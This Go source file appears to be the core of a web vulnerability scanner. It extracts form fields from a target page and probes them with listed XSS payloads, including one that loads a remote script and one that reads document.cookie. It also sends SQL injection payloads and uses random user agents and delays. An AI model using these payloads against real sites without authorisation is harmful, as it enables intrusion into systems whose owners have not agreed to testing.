package core

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
)

var xssPayloads = []string{
	"<script>alert(XSS)</script>", "<img src=x onerror=alert(XSS)>", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
	"<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>", "\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>",
	"<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>", "<a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>",
	"<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>", "</script><script>alert('XSS');</script>", "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
	"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
	"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "<BASE HREF=\"javascript:alert('XSS');//\">",
}

var sqliPayloads = []string{
	"' OR '1'='1' -- ", "' OR 1=1 --", "' UNION SELECT null, version() --", "' AND sleep(5) --",
}

func ExtractFormParams(target string) []string {
	var params []string

	resp, err := http.Get(target)
	if err != nil {
		fmt.Println("error", err)
		return params
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		fmt.Println("error", err)
		return params
	}

	doc.Find("form input").Each(func(i int, input *goquery.Selection) {
		name, exists := input.Attr("name")
		if exists && !strings.Contains(name, "password") {
			params = append(params, name)
		}
	})

	return params
}

func TestForXSS(target string) {
	params := ExtractFormParams(target)
	if len(params) == 0 {
		return
	}

	var wg sync.WaitGroup
	for _, param := range params {
		if IsAlreadyTested(target, param) {
			continue
		}

		for _, payload := range xssPayloads {
			wg.Add(1)
			go func(param, payload string) {
				defer wg.Done()
				RandomDelay()

				var client http.Client
				reqURL := target + "?" + param + "=" + url.QueryEscape(payload)
				req, _ := http.NewRequest("GET", reqURL, nil)

				req.Header.Set("User-Agent", GetRandomUserAgent())

				resp, err := client.Do(req)
				if err == nil && resp.StatusCode == 200 {
					body, _ := io.ReadAll(resp.Body)
					if strings.Contains(string(body), payload) {
						fmt.Printf("⚠️ Possible XSS on %s (%s parameter)\n", reqURL, param)
						MarkAsTested(target, param)
					}
				}
			}(param, payload)
		}
	}
	wg.Wait()
}

func TestForSQLInjection(target string) {
	params := ExtractFormParams(target)
	if len(params) == 0 {
		return
	}

	var wg sync.WaitGroup
	for _, param := range params {
		for _, payload := range sqliPayloads {
			if IsAlreadyTested(target, param) {
				continue
			}

			wg.Add(1)
			go func(param, payload string) {
				defer wg.Done()
				RandomDelay()

				var client http.Client
				reqURL := target + "?" + param + "=" + url.QueryEscape(payload)
				req, _ := http.NewRequest("GET", reqURL, nil)

				req.Header.Set("User-Agent", GetRandomUserAgent())

				resp, err := client.Do(req)
				if err == nil && resp.StatusCode == 200 {
					body, _ := io.ReadAll(resp.Body)
					if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "MySQL") ||
						strings.Contains(string(body), "PostgreSQL") || strings.Contains(string(body), "syntax error") {
						fmt.Printf("⚠️ Possible SQL Injection on %s (%s parameter)\n", reqURL, param)
						MarkAsTested(target, param)
					}
				}
			}(param, payload)
		}
	}
	wg.Wait()
}
